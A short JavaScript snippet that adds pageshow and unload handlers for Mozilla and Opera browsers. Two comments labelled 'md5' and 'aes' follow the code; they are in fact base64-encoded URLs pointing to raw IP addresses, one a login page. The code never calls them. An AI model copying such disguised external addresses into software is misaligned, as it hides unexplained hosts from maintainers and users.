if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzM5Ljk4LjE4OC4xNDQ6ODAwOC8jL2xvZ2luL2xvZ2luPz0x**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/